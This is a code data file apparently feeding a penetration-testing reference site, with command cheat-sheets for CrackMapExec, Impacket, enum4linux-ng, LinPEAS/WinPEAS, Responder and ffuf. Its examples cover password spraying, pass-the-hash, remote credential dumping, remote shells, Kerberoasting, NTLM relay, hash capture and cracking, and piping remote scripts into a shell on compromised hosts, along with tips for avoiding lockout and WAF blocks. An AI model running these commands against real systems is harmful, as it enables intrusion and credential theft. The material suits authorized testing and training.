    invocation: "cme",
    summary:
      "Swiss-army knife for lateral movement in Active Directory environments. Supports SMB, WinRM, MSSQL, LDAP, RDP protocols for credential spraying, enumeration, and command execution.",
    commands: [
      cmd(
        "cme smb sweep",
        "cme smb CIDR",
        "Enumerate hosts in a subnet responding to SMB.",
        [{ code: "cme smb 10.0.0.0/24", note: "Lists hostname, OS, signing status." }],
        "Quick SMB host discovery and SMB signing check.",
        "Enumerate",
      ),
      cmd(
        "cme smb auth test",
        "cme smb TARGET -u USER -p PASS",
        "Test credentials against a host or subnet.",
        [
          { code: "cme smb 10.0.0.5 -u administrator -p 'Password1'", note: "Single host." },
          {
            code: "cme smb 10.0.0.0/24 -u admin -p 'Password1'",
            note: "Password spray across subnet.",
          },
        ],
        "Validating credentials and finding where they work.",
        "Authentication",
      ),
      cmd(
        "cme smb pass-the-hash",
        "cme smb TARGET -u USER -H NTHASH",
        "Authenticate using an NTLM hash instead of a plaintext password.",
        [
          {
            code: "cme smb 10.0.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'",
            note: "Full NTLM hash.",
          },
        ],
        "Lateral movement after extracting hashes from lsass.",
        "Authentication",
      ),
      cmd(
        "cme smb command exec",
        "cme smb TARGET -u USER -p PASS -x 'COMMAND'",
        "Execute a command on remote host via SMB.",
        [
          {
            code: "cme smb 10.0.0.5 -u admin -p 'Pass1' -x 'whoami /all'",
            note: "Runs as the authenticated user.",
          },
        ],
        "Post-exploitation command execution without a full shell.",
        "Execution",
      ),
      cmd(
        "cme smb shares",
        "cme smb TARGET -u USER -p PASS --shares",
        "List accessible SMB shares.",
        [
          {
            code: "cme smb 10.0.0.5 -u admin -p 'Pass1' --shares",
            note: "Shows READ/WRITE access.",
          },
        ],
        "Finding readable shares containing sensitive data.",
        "Enumerate",
      ),
      cmd(
        "cme winrm",
        "cme winrm TARGET -u USER -p PASS -x 'COMMAND'",
        "Execute commands over WinRM (PowerShell Remoting).",
        [
          {
            code: "cme winrm 10.0.0.5 -u admin -p 'Pass1' -x 'whoami'",
            note: "WinRM must be enabled.",
          },
        ],
        "Remote management on Windows Server targets.",
        "Execution",
      ),
      cmd(
        "cme ldap users",
        "cme ldap TARGET -u USER -p PASS --users",
        "Enumerate Active Directory users via LDAP.",
        [
          {
            code: "cme ldap 10.0.0.5 -u ldapuser -p 'LdapPass' --users",
            note: "Lists all AD users.",
          },
        ],
        "AD user enumeration without full domain admin.",
        "LDAP",
      ),
    ],
    errors: [
      err(
        "STATUS_ACCESS_DENIED",
        "Credentials valid but insufficient privileges for the requested action.",
        "Try --local-auth if targeting local accounts. Check if user has admin rights.",
      ),
      err(
        "STATUS_LOGON_FAILURE",
        "Wrong username or password.",
        "Double-check credentials. Beware of account lockout — slow down spraying.",
      ),
      err(
        "Connection timed out / Error connecting",
        "Host down, firewall blocking SMB (445), or wrong IP.",
        "Verify with nmap -p 445 TARGET first.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  impacket suite                                                      */
  /* ------------------------------------------------------------------ */
  {
    slug: "impacket",
    name: "Impacket",
    category: "Exploitation Tools",
    package: "python3-impacket",
    homepage: "https://github.com/fortra/impacket",
    depth: "deep",
    invocation: "impacket-*",
    summary:
      "Python library and collection of scripts for working with network protocols. Includes tools for SMB, WMI, Kerberos, MSSQL, LDAP, and DCE/RPC — essential for Active Directory attacks.",
    commands: [
      cmd(
        "impacket-secretsdump",
        "impacket-secretsdump DOMAIN/USER:PASS@TARGET",
        "Remotely dump SAM, LSA secrets, cached domain credentials, and NTDS.dit hashes.",
        [
          {
            code: "impacket-secretsdump administrator:'Password1'@10.0.0.5",
            note: "Remote SAM+LSA dump.",
          },
          {
            code: "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
            note: "Offline NTDS.dit dump.",
          },
        ],
        "Credential harvesting after gaining admin access.",
        "Credentials",
      ),
      cmd(
        "impacket-psexec",
        "impacket-psexec DOMAIN/USER:PASS@TARGET",
        "Get an interactive shell via SMB using PsExec-style service creation.",
        [
          {
            code: "impacket-psexec administrator:'Pass1'@10.0.0.5 cmd.exe",
            note: "Interactive SYSTEM shell.",
          },
        ],
        "Remote code execution with admin credentials.",
        "Execution",
      ),
      cmd(
        "impacket-wmiexec",
        "impacket-wmiexec DOMAIN/USER:PASS@TARGET",
        "Execute commands via WMI (semi-interactive shell).",
        [
          {
            code: "impacket-wmiexec administrator:'Pass1'@10.0.0.5",
            note: "Half-interactive WMI shell.",
          },
        ],
        "Stealthier execution than psexec (no service creation).",
        "Execution",
      ),
      cmd(
        "impacket-GetNPUsers",
        "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP",
        "AS-REP Roasting: get Kerberos TGTs for accounts with pre-auth disabled.",
        [
          {
            code: "impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1 -format hashcat",
            note: "Hashcat-ready hashes.",
          },
        ],
        "Cracking AS-REP hashes offline without domain credentials.",
        "Kerberos",
      ),
      cmd(
        "impacket-GetUserSPNs",
        "impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request",
        "Kerberoasting: request TGS tickets for service accounts (SPNs) and extract for cracking.",
        [
          {
            code: "impacket-GetUserSPNs corp.local/jsmith:Password1 -dc-ip 10.0.0.1 -request -outputfile spns.txt",
            note: "Save hashes for hashcat.",
          },
        ],
        "Cracking service account passwords offline.",
        "Kerberos",
      ),
      cmd(
        "impacket-smbclient",
        "impacket-smbclient DOMAIN/USER:PASS@TARGET",
        "Interactive SMB client for share browsing and file transfer.",
        [
          {
            code: "impacket-smbclient administrator:'Pass1'@10.0.0.5",
            note: "shares, use C$, ls, get file.txt.",
          },
        ],
        "Exploring and exfiltrating files over SMB.",
        "SMB",
      ),
      cmd(
        "impacket-ntlmrelayx",
        "sudo impacket-ntlmrelayx -tf targets.txt -smb2support",
        "NTLM relay attack: intercept and relay NTLM authentication to target systems.",
        [
          {
            code: "sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i",
            note: "Interactive shell on relay.",
          },
          {
            code: "sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'",
            note: "Execute command on relay.",
          },
        ],
        "Exploiting NTLM authentication in networks without SMB signing.",
        "Relay",
      ),
    ],
    errors: [
      err(
        "SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND",
        "The share or path specified does not exist.",
        "List available shares first with smbclient //TARGET -N -L.",
      ),
      err(
        "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)",
        "System time out of sync with the domain controller.",
        "sudo ntpdate <DC_IP> or sudo date -s $(curl -s --head google.com | grep Date | cut -d' ' -f3-6).",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  enum4linux-ng                                                       */
  /* ------------------------------------------------------------------ */
  {
    slug: "enum4linux-ng",
    name: "enum4linux-ng",
    category: "Information Gathering",
    package: "enum4linux-ng",
    homepage: "https://github.com/cddmp/enum4linux-ng",
    depth: "deep",
    invocation: "enum4linux-ng",
    summary:
      "Rewrite of enum4linux for enumerating Windows and Samba hosts: users, groups, shares, policies, RID cycling, and OS information via SMB/MSRPC/LDAP.",
    commands: [
      cmd(
        "enum4linux-ng basic",
        "enum4linux-ng TARGET",
        "Run all enumeration modules against a target.",
        [
          {
            code: "enum4linux-ng 10.0.0.5",
            note: "Full auto-enum: OS, users, groups, shares, password policy.",
          },
        ],
        "Standard Windows/Samba enumeration during internal pentest.",
        "Enumerate",
      ),
      cmd(
        "enum4linux-ng with creds",
        "enum4linux-ng -u USER -p PASS TARGET",
        "Authenticate before enumeration to get more details.",
        [{ code: "enum4linux-ng -u guest -p '' 10.0.0.5", note: "Try null/guest session." }],
        "Getting additional info with valid credentials.",
        "Authenticate",
      ),
      cmd(
        "enum4linux-ng JSON output",
        "enum4linux-ng TARGET -oJ output.json",
        "Save results in JSON format for scripting.",
        [{ code: "enum4linux-ng 10.0.0.5 -oJ enum.json", note: "Machine-readable output." }],
        "Importing results into SIEM or custom tools.",
        "Output",
      ),
    ],
    errors: [
      err(
        "Could not connect to target",
        "SMB not available or firewall blocking port 445/139.",
        "Verify with nmap -p 139,445 TARGET. Some hosts require NetBIOS over TCP.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  linpeas / winpeas                                                   */
  /* ------------------------------------------------------------------ */
  {
    slug: "linpeas",
    name: "PEASS-ng (LinPEAS / WinPEAS)",
    category: "Post Exploitation",
    package: "peass",
    homepage: "https://github.com/carlospolop/PEASS-ng",
    depth: "deep",
    invocation: "linpeas.sh",
    summary:
      "Privilege Escalation Awesome Scripts Suite. LinPEAS finds privilege escalation vectors on Linux; WinPEAS does the same on Windows. Colour-coded output highlights critical findings.",
    commands: [
      cmd(
        "linpeas download and run",
        "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "Download and execute linpeas directly from GitHub.",
        [
          {
            code: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee linpeas.txt",
            note: "Save output locally.",
          },
        ],
        "Quick privilege escalation check on a compromised Linux host.",
        "Execute",
      ),
      cmd(
        "linpeas from file",
        "chmod +x linpeas.sh && ./linpeas.sh",
        "Run a downloaded copy of linpeas.",
        [
          {
            code: "./linpeas.sh -a 2>/dev/null | tee linpeas.txt",
            note: "All checks, save output.",
          },
          { code: "./linpeas.sh -q 2>/dev/null", note: "Quiet mode — only highlights." },
        ],
        "Offline escalation check without internet access on target.",
        "Execute",
      ),
      cmd(
        "linpeas specific check",
        "./linpeas.sh -s",
        "Run only SUID/GUID checks (faster targeted check).",
        [
          {
            code: "./linpeas.sh -s 2>/dev/null | grep -E 'SUID|SGID'",
            note: "Find SUID binaries quickly.",
          },
        ],
        "Quick SUID check when time is limited.",
        "Execute",
      ),
      cmd(
        "winpeas download and run",
        "certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe winpeas.exe && winpeas.exe",
        "Download and run WinPEAS on a Windows target.",
        [
          {
            code: "certutil -urlcache -split -f https://...winPEASx64.exe winpeas.exe",
            note: "Download 64-bit.",
          },
          { code: ".\\winpeas.exe > C:\\Temp\\winpeas.txt", note: "Save output." },
        ],
        "Automated privilege escalation enumeration on Windows.",
        "Windows",
      ),
    ],
    errors: [
      err(
        "Permission denied: ./linpeas.sh",
        "Script not executable.",
        "chmod +x linpeas.sh before running.",
      ),
      err(
        "bash: linpeas.sh: command not found",
        "Wrong working directory.",
        "Use ./linpeas.sh with the leading ./ to run from the current directory.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  responder                                                           */
  /* ------------------------------------------------------------------ */
  {
    slug: "responder",
    name: "Responder",
    category: "Sniffing & Spoofing",
    package: "responder",
    homepage: "https://github.com/lgandx/Responder",
    depth: "deep",
    invocation: "responder",
    summary:
      "LLMNR/NBT-NS/mDNS poisoner that captures NTLMv1/v2 hashes from Windows hosts automatically when they attempt to resolve non-existent hosts. Includes HTTP, SMB, FTP, and LDAP rogue servers.",
    commands: [
      cmd(
        "responder basic",
        "sudo responder -I INTERFACE -wv",
        "Start Responder in default mode: poisoning LLMNR/NBT-NS/mDNS and capturing NTLMv2 hashes.",
        [{ code: "sudo responder -I eth0 -wv", note: "Wpad poisoning + verbose mode." }],
        "Passively capturing NTLM hashes on internal networks.",
        "Poison",
      ),
      cmd(
        "responder analyse mode",
        "sudo responder -I INTERFACE -A",
        "Analyse mode — listen and report without poisoning (safe for detection avoidance).",
        [
          {
            code: "sudo responder -I eth0 -A",
            note: "Read-only: see who is broadcasting without poisoning.",
          },
        ],
        "Understanding network traffic before active poisoning.",
        "Analyse",
      ),
      cmd(
        "responder with rdp/ftp",
        "sudo responder -I INTERFACE -wv --rdp",
        "Enable all rogue servers including RDP.",
        [
          {
            code: "sudo responder -I eth0 -wv --rdp --ftp",
            note: "Capture RDP and FTP credentials too.",
          },
        ],
        "Maximising capture opportunities on mixed networks.",
        "Poison",
      ),
      cmd(
        "responder logs",
        "cat /usr/share/responder/logs/",
        "View captured hashes in the logs directory.",
        [
          {
            code: "cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt",
            note: "NTLMv2 hashes for cracking.",
          },
          {
            code: "hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.5.txt rockyou.txt",
            note: "Crack with hashcat.",
          },
        ],
        "Extracting hashes for offline cracking.",
        "Output",
      ),
    ],
    errors: [
      err(
        "Address already in use",
        "Another service (typically the OS itself) is using port 80 or 443.",
        "Stop conflicting services: sudo systemctl stop apache2 nginx. Or use -F to force.",
      ),
      err(
        "Error starting TCP server on port 445: [Errno 98] Address already in use",
        "Samba or another SMB service is running.",
        "sudo systemctl stop smbd nmbd before running Responder.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  ffuf                                                                */
  /* ------------------------------------------------------------------ */
  {
    slug: "ffuf",
    name: "ffuf",
    category: "Web Application Analysis",
    package: "ffuf",
    homepage: "https://github.com/ffuf/ffuf",
    depth: "deep",
    invocation: "ffuf",
    summary:
      "Fast web fuzzer written in Go. Replaces FUZZ keyword in URL, headers, POST data, and cookies. Excellent for directory brute-forcing, virtual host discovery, and parameter fuzzing.",
    commands: [
      cmd(
        "ffuf directory",
        "ffuf -u http://TARGET/FUZZ -w WORDLIST",
        "Brute-force directories and files.",
        [
          {
            code: "ffuf -u http://10.0.0.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
            note: "Common paths.",
          },
          {
            code: "ffuf -u http://10.0.0.5/FUZZ -w big.txt -e .php,.html,.txt -mc 200,301,302",
            note: "With extensions and status filter.",
          },
        ],
        "Discovering hidden files and paths.",
        "Directory",
      ),
      cmd(
        "ffuf vhost",
        "ffuf -u http://IP -H 'Host: FUZZ.TARGET' -w WORDLIST",
        "Fuzz virtual host headers to discover vhosts on the same IP.",
        [
          {
            code: "ffuf -u http://10.0.0.5 -H 'Host: FUZZ.target.com' -w subdomains.txt -fs 4242",
            note: "-fs filters default page size.",
          },
        ],
        "Finding hidden vhosts/subdomains on shared IPs.",
        "VHost",
      ),
      cmd(
        "ffuf POST fuzz",
        "ffuf -u URL -X POST -d 'user=FUZZ&pass=FUZZ2' -w users.txt:FUZZ -w passes.txt:FUZZ2",
        "Fuzz POST body parameters.",
        [
          {
            code: "ffuf -u http://10.0.0.5/login -X POST -d 'username=FUZZ&******' -w users.txt -mc 302",
            note: "Find valid usernames.",
          },
        ],
        "Login brute-force and parameter injection.",
        "POST",
      ),
      cmd(
        "ffuf rate limit",
        "ffuf -u URL/FUZZ -w WORDLIST -rate 50",
        "Limit requests per second to avoid rate limiting.",
        [
          {
            code: "ffuf -u http://10.0.0.5/FUZZ -w big.txt -rate 50 -t 5",
            note: "50 req/s, 5 threads.",
          },
        ],
        "Avoiding WAF blocks or target overload.",
        "Control",
      ),
      cmd(
        "ffuf filter / match",
        "ffuf -u URL/FUZZ -w WORDLIST -fc 404 -fs 0",
        "Filter out responses by status code or size.",
        [
          {
            code: "ffuf -u http://10.0.0.5/FUZZ -w big.txt -fc 404,403 -fs 0,1234",
            note: "Hide 404/403 and specific size.",
          },
        ],
        "Reducing noise in fuzzing output.",
        "Filter",
      ),
    ],
    errors: [
      err(
        "the server is not responding as expected",
        "Rate limit or WAF triggering.",
        "Add -rate 10 and -t 1 to slow down. Consider rotating User-Agent with -H.",
      ),
    ],
  },
];
